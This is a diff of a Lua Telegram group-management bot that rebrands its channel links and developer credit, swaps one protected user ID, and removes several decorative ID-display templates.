 ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
 ♪︙نقاطي • بيع نقاطي
 ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
-♪︙[Source Channel](https://t.me/U56RRR)
+♪︙[Source Channel](https://t.me/CUKUR_TAEM)
 ]], 1, 'md')
 else
 Dev_Ali(msg.chat_id_, msg.id_, 1, '♪︙عذرا الالعاب معطله في المجموعه', 1, 'md')
@@ -4219,14 +4219,14 @@ end
 if text == "السورس" or text == "سورس" then 
 Text = [[
 Welcome To Source
-♪︙[CUKUR TAEM](https://t.me/CUKUR_TAEM)
+♪︙[NaJaF TEAM](https://t.me/CUKUR_TAEM)
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
 {{text = '♪ Source Channel',url="https://t.me/CUKUR_TAEM"}},
 {{text = '♪ Exp Source',url="t.me/F2222P"}},
-{{text = '♪ Developer',url="t.me/u2288"}},
-{{text = '♪ Tws NaJaF',url="https://t.me/FR88BoT"}},
+{{text = '♪ Developer',url="t.me/U2288"}},
+{{text = '♪ Tws NaJaF',url="https://t.me/FR88BOT"}},
 }
 local msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
@@ -4405,7 +4405,7 @@ if tonumber(result.id_) == tonumber(DevId) then
 Dev_Ali(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md') 
 return false  
 end  
-if tonumber(result.id_) == tonumber(1420345305) then 
+if tonumber(result.id_) == tonumber(2025738733) then 
 Dev_Ali(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md') 
 return false  
 end  
@@ -4436,7 +4436,7 @@ if tonumber(result.sender_user_id_) == tonumber(DevId) then
 Dev_Ali(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md')
 return false
 end 
-if tonumber(result.sender_user_id_) == tonumber(1420345305) then  
+if tonumber(result.sender_user_id_) == tonumber(2025738733) then  
 Dev_Ali(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md')
 return false
 end 
@@ -6397,7 +6397,7 @@ if dp.first_name_ == false then
 Dev_Ali(msg.chat_id_, msg.id_, 1, "♪︙حساب المنشئ محذوف", 1, "md")
 return false  
 end
-local UserName = (dp.username_ or "U56RRR")
+local UserName = (dp.username_ or "CUKUR_TAEM")
 Dev_Ali(msg.chat_id_, msg.id_, 1, "♪︙مالك المجموعه ↫ ["..dp.first_name_.."](T.me/"..UserName..")", 1, "md")  
 end,nil)   
 end
@@ -6613,7 +6613,7 @@ if dp.first_name_ == false then
 Dev_Ali(msg.chat_id_, msg.id_, 1, "♪︙حساب المنشئ محذوف", 1, "md")
 return false  
 end
-local UserName = (dp.username_ or "U56RRR")
+local UserName = (dp.username_ or "CUKUR_TAEM")
 Dev_Ali(msg.chat_id_, msg.id_, 1, "♪︙تم رفع مالك المجموعه ↫ ["..dp.first_name_.."](T.me/"..UserName..")", 1, "md") 
 DevAli:sadd(NaJaF.."Ali:AliConstructor:"..msg.chat_id_,dp.id_)
 end,nil)   
@@ -6969,35 +6969,10 @@ if Manager(msg) then
 if text and text:match("^تغيير الايدي$") and ChCheck(msg) or text and text:match("^تغير الايدي$") and ChCheck(msg) then 
 local List = {
 [[
-- ايديڪ  ⁞ #id 💘 ٬
-- يوزرڪ القميل ⁞ #username 💘 ٬
-- رسائلڪ  الطيفهہَ ⁞ #msgs 💘 ٬
-- رتبتڪ الحلوه ⁞ #stast  💘٬
-- سحڪاتڪ الفول ⁞ #edit 💘 ٬
-]],
-[[
 ゠𝚄𝚂𝙴𝚁 𖨈 #username 𖥲 .
 ゠𝙼𝚂𝙶 𖨈 #msgs 𖥲 .
 ゠𝚂𝚃𝙰 𖨈 #stast 𖥲 .
 ゠𝙸𝙳 𖨈 #id 𖥲 .
-]],
-[[
-- UsEr🇺🇸 ꙰ #username
-- StA🇺🇸 ꙰   #msgs
-- MsGs🇺🇸 ꙰ #stast
-- ID🇺🇸 ꙰  #id
-]],
-[[
-➜𝗨𝗦𝗘𝗥𝗡𝗔𝗠𝗘 : #username
-➜𝗠𝗘𝗦𝗦𝗔𝗚𝗘𝗦 : #msgs
-➜𝗦𝗧𝗔𝗧𝗦 : #stast
-➜𝗜𝗗 : #id
-]],
-[[
-- 𝐘𝐨𝐮𝐫 𝐈𝐃 🃏🇮🇶- #id 
-- 𝐔𝐬𝐞𝐫𝐍𝐚🃏🇮🇶- #username 
-- 𝐒𝐭𝐚𝐬𝐓 🃏🇮🇶- #stast 
-- 𝐌𝐬𝐠𝐒🃏🇮🇶 - #msgs
 ]],
 [[
 ➭- 𝒔𝒕𝒂𓂅 #stast 𓍯. 💕
@@ -7042,20 +7017,6 @@ local List = {
 - 𓏬 𝐌𝐬𝐆  : #msgs 𓂅 .
 - 𓏬 𝐒𝐭𝐀 : #stast 𓂅 .
 - 𓏬 𝐈𝐃 : #id 𓂅 .
-]],
-[[
-• ﮼ايديك  #id 🌻 ٬
-• ﮼يوزرك ➺ #username 🌻 ٬
-• ﮼مسجاتك ➺ #msgs 🌻 ٬
-•  ﮼رتبتك➺ #stast 🌻 ٬
-• ﮼تعديلك ➺ #edit 🌻 ٬
-]],
-[[
--›   𝚄𝚂𝙴𝚁𝙽𝙰𝙼𝙴 . #username 🇵🇸 ꙰ 
--›   𝚂𝚃𝙰𝚂𝚃 . #stast 🇵🇸 ꙰
--›   𝙸𝙳 . #id 🇵🇸 ꙰ 
--›   𝙶𝙼𝙰𝚂 . #gmas 🇵🇸 ꙰ 
--›   𝙼𝚂𝙶𝚂 . #msgs 🇵🇸 ꙰
 ]],
 [[
 .𖣂 𝙪𝙨𝙚𝙧𝙣𝙖𝙢𝙚 , #username  
@@ -8627,7 +8588,7 @@ local TXTE = "♪︙اعدادات المجموعه ↫ ⤈\n┉ ≈ ┉ ≈ ┉
 .."♪︙التكرار ↫ "..flood.."\n"
 .."♪︙عدد التكرار ↫ "..Flood_Num.."\n"
 .."♪︙عدد السبام ↫ "..spam_c.."\n"
-.."┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n♪︙[Source Channel](https://t.me/U56RRR)\n"
+.."┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n♪︙[Source Channel](https://t.me/CUKUR_TAEM)\n"
 Dev_Ali(msg.chat_id_, msg.id_, 1, TXTE, 1, 'md')
 end
 end
@@ -8902,7 +8863,7 @@ if Audios.Info == true then
 local Text ='♪︙تم اختيار المقطع الصوتي لك'
 keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = '♪ NaJaF TeAM .',url="t.me/U56RRR"}},
+{{text = '♪ NaJaF TeAM .',url="t.me/CUKUR_TAEM"}},
 }
 local msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..TokenBot..'/sendVoice?chat_id='..msg.chat_id_..'&voice='..URL.escape(Audios.info)..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
@@ -9183,7 +9144,7 @@ local TkeedList = DevAli:scard(NaJaF.."Ali:Ali:Tkeed:"..ChatId) or 0
 local AdminsList = DevAli:scard(NaJaF.."Ali:Admins:"..ChatId) or 0
 local VipList = DevAli:scard(NaJaF.."Ali:VipMem:"..ChatId) or 0
 local LinkGp = json:decode(https.request('https://api.telegram.org/bot'..TokenBot..'/exportChatInviteLink?chat_id='..ChatId))
-if LinkGp.ok == true then LinkGroup = LinkGp.result else LinkGroup = 't.me/U56RRR' end
+if LinkGp.ok == true then LinkGroup = LinkGp.result else LinkGroup = 't.me/CUKUR_TAEM' end
 tdcli_function({ID ="GetChat",chat_id_=ChatId},function(arg,dp)
 tdcli_function ({ID = "GetChannelMembers",channel_id_ = ChatId:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data) 
 if dp.id_ then
@@ -9193,7 +9154,7 @@ if data.members_[i].status_.ID == "ChatMemberStatusCreator" then
 Manager_id = admins[i].user_id_
 tdcli_function ({ID = "GetUser",user_id_ = Manager_id},function(arg,Ali) 
 if Ali.first_name_ ~= false then
-ConstructorAli = "["..Ali.first_name_.."](T.me/"..(Ali.username_ or "U56RRR")..")"
+ConstructorAli = "["..Ali.first_name_.."](T.me/"..(Ali.username_ or "CUKUR_TAEM")..")"
 else 
 ConstructorAli = "حساب محذوف"
 end
@@ -10023,7 +9984,7 @@ local Text = [[
 ♪︙م5 ↫ اوامر المطورين
 ♪︙م6 ↫ اوامر الاعضاء
 ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
-♪︙[Source Channel](https://t.me/U56RRR)
+♪︙[Source Channel](https://t.me/CUKUR_TAEM)
 ]] 
 keyboard = {} 
 keyboard.inline_keyboard = {{{text="اوامر الادمنيه",callback_data="/HelpList2:"..msg.sender_user_id_},{text="اوامر الحمايه",callback_data="/HelpList1:"..msg.sender_user_id_}},{{text="اوامر المنشئين",callback_data="/HelpList4:"..msg.sender_user_id_},{text="اوامر المدراء",callback_data="/HelpList3:"..msg.sender_user_id_}},{{text="اوامر الاعضاء",callback_data="/HelpList6:"..msg.sender_user_id_},{text="اوامر المطورين",callback_data="/HelpList5:"..msg.sender_user_id_}},{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..msg.sender_user_id_}}}
@@ -10095,7 +10056,7 @@ local Text = [[
 ♪︙البوتات بالطرد
 ♪︙البوتات بالتقيد
 ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
-♪︙[Source Channel](https://t.me/U56RRR)
+♪︙[Source Channel](https://t.me/CUKUR_TAEM)
 ]]
 Dev_Ali(msg.chat_id_, msg.id_, 1, (Help or Text), 1, 'md')
 end end
@@ -10171,7 +10132,7 @@ local Text = [[
 ♪︙تقييد يوم + عدد الايام
 ♪︙الغاء تقييد ↫ لالغاء التقييد بالوقت
 ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
-♪︙[Source Channel](https://t.me/U56RRR)
+♪︙[Source Channel](https://t.me/CUKUR_TAEM)
 ]]
 Dev_Ali(msg.chat_id_, msg.id_, 1, (Help or Text), 1, 'md')
 end end
@@ -10236,7 +10197,7 @@ local Text = [[
 ♪︙ردود المدير • ردود المطور • التحقق
 ♪︙ضافني • حساب العمر • الزخرفه
 ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
-♪︙[Source Channel](https://t.me/U56RRR)
+♪︙[Source Channel](https://t.me/CUKUR_TAEM)
 ]]
 Dev_Ali(msg.chat_id_, msg.id_, 1, (Help or Text), 1, 'md')
 end end
@@ -10295,7 +10256,7 @@ local Text = [[
 ♪︙المنشئين الاساسيين 
 ♪︙حذف جميع الرتب
 ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
-♪︙[Source Channel](https://t.me/U56RRR)
+♪︙[Source Channel](https://t.me/CUKUR_TAEM)
 ]]
 Dev_Ali(msg.chat_id_, msg.id_, 1, (Help or Text), 1, 'md')
 end end
@@ -10381,7 +10342,7 @@ local Text = [[
 ♪︙ترحيب البوت • المغادره
 ♪︙البوت الخدمي • التواصل
 ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
-♪︙[Source Channel](https://t.me/U56RRR)
+♪︙[Source Channel](https://t.me/CUKUR_TAEM)
 ]]
 Dev_Ali(msg.chat_id_, msg.id_, 1, (Help or Text), 1, 'md')
 end end
@@ -10429,7 +10390,7 @@ local Text = [[
 ♪︙تحويل + بالرد ↫ صوره • ملصق • صوت • بصمه
 ♪︙انطق + الكلام تدعم جميع اللغات مع الترجمه للعربي
 ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
-♪︙[Source Channel](https://t.me/U56RRR)
+♪︙[Source Channel](https://t.me/CUKUR_TAEM)
 ]]
 Dev_Ali(msg.chat_id_, msg.id_, 1, (Help or Text), 1, 'md')
 end
@@ -10636,7 +10597,7 @@ Dev_Ali(msg.chat_id_, msg.id_, 1, '♪︙لم يتم تعيين قناة الا�
 end end end end
 --     Source NaJaF     --
 if text == 'القناة' or text == 'قناة السورس' or text == 'قناه السورس' or text == 'قنات السورس' then 
-Dev_Ali(msg.chat_id_, msg.id_, 1, '♪︙Channel ↬ [@U56RRR]', 1, 'md')    
+Dev_Ali(msg.chat_id_, msg.id_, 1, '♪︙Channel ↬ [@CUKUR_TAEM]', 1, 'md')    
 end 
 --     Source NaJaF     --
 if Sudo(msg) then 
@@ -10769,8 +10730,8 @@ end
 --     Source NaJaF     --
 end 
 ------------------------------------------------
--- This Source Was Developed By (RaHMaN) @U2288.--
---   This Is Th Source Channel @CUKUR_TAEM .   --
+-- This Source Was Developed By (Ali) @AAAPA.--
+--   This Is The Source Channel @CUKUR_TAEM .   --
 --                - NaJaF -                 --
 --        -- https://t.me/CUKUR_TAEM --         --
 ------------------------------------------------ 
